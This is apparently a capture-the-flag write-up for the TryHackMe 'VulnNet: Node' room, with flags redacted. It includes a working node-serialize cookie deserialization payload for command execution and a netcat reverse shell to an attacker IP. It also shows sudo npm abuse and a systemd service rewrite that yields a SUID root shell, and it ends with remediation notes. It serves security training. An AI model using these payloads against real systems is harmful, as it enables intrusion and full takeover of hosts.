# VulnNet: Node

Room: https://tryhackme.com/room/vulnnetnode

After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/vulnnetnode.md

---

## Summary

VulnNet Node exposed a Node.js Express application on port `8080`. The application stored user session data in a base64 encoded cookie and passed the decoded value directly into `node-serialize.unserialize`. By crafting a malicious serialized object using the `_$$ND_FUNC$$_` marker, we gained command execution as the `www` user.

From there, `sudo -l` showed that `www` could run `npm` as `serv-manage`. We used an npm script to pivot to `serv-manage`, collected the user flag, then found that `serv-manage` could run limited `systemctl` commands as root. The related systemd timer and service files were group writable, allowing us to modify the service to create a SUID root bash binary and escalate to root.

Flags and secrets have been redacted.

---

## Enumeration

Initial full port scan found SSH and a Node.js Express web service.

```bash
nmap -sV -p- 10.64.136.197
```

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-12 10:56 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.64.136.197
Host is up (0.00023s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
```

Port `8080` showed a Node.js Express application.

---

## Checking the Login Page

The `/login` page returned a login form.

```bash
curl -i http://10.64.136.197:8080/login
```

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sun, 24 Jan 2021 15:26:02 GMT
ETag: W/"84f-177350083bb"
Content-Type: text/html; charset=UTF-8
Content-Length: 2127
Date: Tue, 12 May 2026 10:29:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

A POST request to `/login` returned `Cannot POST /login`.

```bash
curl -i -X POST http://10.64.136.197:8080/login -d "username=test&password=test"
```

```text
HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 145
Date: Tue, 12 May 2026 10:30:02 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /login</pre>
</body>
</html>
```

The login form was not a real authentication endpoint. The form had no `method`, no `action`, and the input fields had no `name` attributes, so submitting it did not send useful credentials.

---

## Directory Enumeration

A Gobuster scan against the image directory found a real static path.

```bash
gobuster dir -u http://10.64.136.197:8080/img/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x png,jpg,jpeg,gif,svg,webp,ico
```

```text
/common               (Status: 301) [Size: 187] [--> /img/common/]
```

Further enumeration found an avatar image.

```text
http://10.64.136.197:8080/img/common/ericf-avatar.png
```

This gave a likely username clue: `ericf`.

---

## Session Cookie Discovery

The application used a cookie called `session`.

```text
session="eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ=="
```

Decoding it showed JSON session data.

```bash
echo 'eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==' | base64 -d
```

```json
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Changing the cookie proved the server trusted the cookie data.

```bash
SESSION=$(echo -n '{"username":"ericf","isGuest":false,"encoding":"utf-8"}' | base64 -w 0)

curl -i http://10.64.136.197:8080/ -H "Cookie: session=$SESSION"
```

Relevant output:

```html
<h1 class="brand-title">Welcome, ericf</h1>
```

This confirmed the session cookie was decoded and used by the application.

---

## Confirming Node Serialize Execution

The page hint discussed Node.js vulnerabilities and dependency security. Since the cookie contained serialized user data, we tested for classic `node-serialize` function execution using the `_$$ND_FUNC$$_` marker.

```bash
SESSION=$(echo -n '{"username":"_$$ND_FUNC$$_function(){return \"pwned\"}()","isGuest":false,"encoding":"utf-8"}' | base64 -w 0)

curl -i http://10.64.136.197:8080/ -H "Cookie: session=$SESSION"
```

Relevant output:

```html
<h1 class="brand-title">Welcome, pwned</h1>
```

This confirmed server side JavaScript execution.

Next, we tested command execution with `child_process.execSync`.

```bash
CMD='id'

SESSION=$(echo -n "{\"username\":\"_\$\$ND_FUNC\$\$_function(){return require(\\\"child_process\\\").execSync(\\\"$CMD\\\").toString()}()\",\"isGuest\":false,\"encoding\":\"utf-8\"}" | base64 -w 0)

curl -s http://10.64.136.197:8080/ -H "Cookie: session=$SESSION" | grep -o "Welcome,.*</h1>"
```

Output was mangled by HTML rendering and filtering, but confirmed command execution as `www`.

```text
Welcome, uid1001wwwgid1001wwwgroups1001wwwn</h1>
```

---

## Reverse Shell as www

After the target was restarted, the new target IP was:

```text
10.64.184.27
```

A listener was started on the attacking machine.

```bash
nc -lvnp 5555
```

The working reverse shell payload was:

```bash
CMD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.205.203 5555 >/tmp/f'

SESSION=$(echo -n "{\"username\":\"_\$\$ND_FUNC\$\$_function(){return require(\\\"child_process\\\").execSync(\\\"$CMD\\\").toString()}()\",\"isGuest\":false,\"encoding\":\"utf-8\"}" | base64 -w 0)

curl -s http://10.64.184.27:8080/ -H "Cookie: session=$SESSION"
```

Listener output:

```text
pingu@nootnoot:~/Downloads/THM$ nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.64.184.27 33936
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www
```

Shell was gained as `www`.

---

## Source Code Review

Inside the application directory, `server.js` confirmed the vulnerability.

```bash
cat server.js
```

```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var path = require('path');
var app = express();
app.use(cookieParser())
app.set('view engine',  'pug');

app.use('/css', express.static('css'));
app.use('/img', express.static('img'));

app.get('/', function(req, res) {
 if (req.cookies.session) {
   var str = new Buffer(req.cookies.session, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     var username2 = JSON.stringify(obj.username).replace(/[^0-9a-z]/gi, '');
     obj.username = username2
     res.render('../index', {username: obj.username})
   }
 } else {
     res.cookie('session', "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==", {
       maxAge: 1200000,
       httpOnly: true
     });
 }
res.render('../index', {username: "Guest"});
});

app.get('/login', function(req, res) {
	res.sendFile(path.join(__dirname+'/login.html'));
});
app.listen(8080);
```

The vulnerable lines were:

```js
var str = new Buffer(req.cookies.session, 'base64').toString();
var obj = serialize.unserialize(str);
```

The application decoded attacker controlled cookie data and passed it directly to `node-serialize.unserialize`.

---

## Privilege Escalation to serv-manage

Checking sudo permissions as `www` showed that `npm` could be run as `serv-manage` without a password.

```bash
sudo -l
```

```text
Matching Defaults entries for www on ip-10-64-136-197:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on ip-10-64-136-197:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

The target had npm `6.14.18`, so `npm exec` was not available. Instead, we created a package with a script that spawned `/bin/sh`.

```bash
mkdir /tmp/npmpriv
cd /tmp/npmpriv
echo '{"scripts":{"pwn":"/bin/sh"}}' > package.json
sudo -u serv-manage /usr/bin/npm run pwn --unsafe-perm
```

```text
> @ pwn /tmp/npmpriv
> /bin/sh

$ whoami
serv-manage
```

We successfully pivoted to `serv-manage`.

---

## User Flag

The user flag was in the `serv-manage` home directory.

```bash
cd ~
ls
cat user.txt
```

```text
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
THM{REDACTED}
```

---

## Privilege Escalation to root

Checking sudo permissions as `serv-manage` showed limited access to `systemctl`.

```bash
sudo -l
```

```text
Matching Defaults entries for serv-manage on ip-10-64-136-197:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on ip-10-64-136-197:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

We inspected the timer and service files.

```bash
ls -la /etc/systemd/system/vulnnet-auto.*
```

```text
-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer
```

```bash
systemctl cat vulnnet-auto.timer
```

```text
# /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

The timer pointed to `vulnnet-job.service`. That service was also group writable.

```bash
find /etc/systemd /lib/systemd -name 'vulnnet-job.service' -ls 2>/dev/null
ls -la /etc/systemd/system/vulnnet-job.service
```

```text
   157585      4 -rw-rw-r--   1 root     serv-manage      197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
```

```bash
systemctl cat vulnnet-job.service
```

```text
# /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

Because the service file was writable by the `serv-manage` group and the user could run `systemctl daemon-reload` plus start the timer as root, we modified the service to create a SUID root bash binary.

```bash
cat > /etc/systemd/system/vulnnet-job.service <<'END'
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'

[Install]
WantedBy=multi-user.target
END
```

We also modified the timer to trigger quickly.

```bash
cat > /etc/systemd/system/vulnnet-auto.timer <<'END'
[Unit]
Description=Run VulnNet utilities quickly

[Timer]
OnActiveSec=5
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
END
```

The final files looked like this.

```bash
cat /etc/systemd/system/vulnnet-job.service
```

```text
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'

[Install]
WantedBy=multi-user.target
```

```bash
cat /etc/systemd/system/vulnnet-auto.timer
```

```text
[Unit]
Description=Run VulnNet utilities quickly

[Timer]
OnActiveSec=5
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

Then we reloaded systemd and started the timer.

Important note: these sudo commands must be run one at a time. If commands are pasted together and become joined, sudo will ask for a password because the command no longer matches the allowed sudo rule.

```bash
sudo /bin/systemctl daemon-reload
```

```bash
sudo /bin/systemctl stop vulnnet-auto.timer
```

```bash
sudo /bin/systemctl start vulnnet-auto.timer
```

After a short wait, `/tmp/rootbash` was created.

```bash
sleep 8
ls -la /tmp/rootbash
/tmp/rootbash -p
```

```text
rootbash-5.0# whoami
root
```

---

## Root Flag

```bash
cd /root
ls
cat root.txt
```

```text
THM{REDACTED}
```

---

## Attack Chain Recap

```text
1. Enumerated port 8080 and identified Node.js Express.
2. Found the session cookie contained base64 encoded JSON.
3. Changed the cookie and confirmed the app trusted it.
4. Used the _$$ND_FUNC$$_ node-serialize marker to confirm server side JavaScript execution.
5. Used child_process.execSync inside the serialized cookie to gain command execution.
6. Caught a reverse shell as www.
7. Found www could run npm as serv-manage using sudo.
8. Used an npm script to spawn a shell as serv-manage.
9. Read user.txt from /home/serv-manage.
10. Found serv-manage could run limited systemctl commands as root.
11. Found vulnnet-auto.timer and vulnnet-job.service were group writable.
12. Modified vulnnet-job.service to create a SUID bash binary.
13. Modified vulnnet-auto.timer to run quickly.
14. Reloaded systemd and started the timer.
15. Used /tmp/rootbash -p to become root.
16. Read root.txt.
```

---

## Remediation Notes

The main issue was unsafe deserialization of attacker controlled data.

Recommended fixes:

- Do not deserialize untrusted user input.
- Do not store trusted session state directly in client controlled cookies unless it is signed and validated.
- Avoid vulnerable or outdated packages such as `node-serialize` for session handling.
- Use standard session middleware such as `express-session` with secure server side session storage.
- Keep dependencies patched and run tools such as `npm audit`, `osv-scanner`, `trivy`, or `retire.js`.
- Do not make systemd service files writable by non-root groups unless absolutely required.
- Avoid broad or dangerous sudo permissions around package managers and service managers.
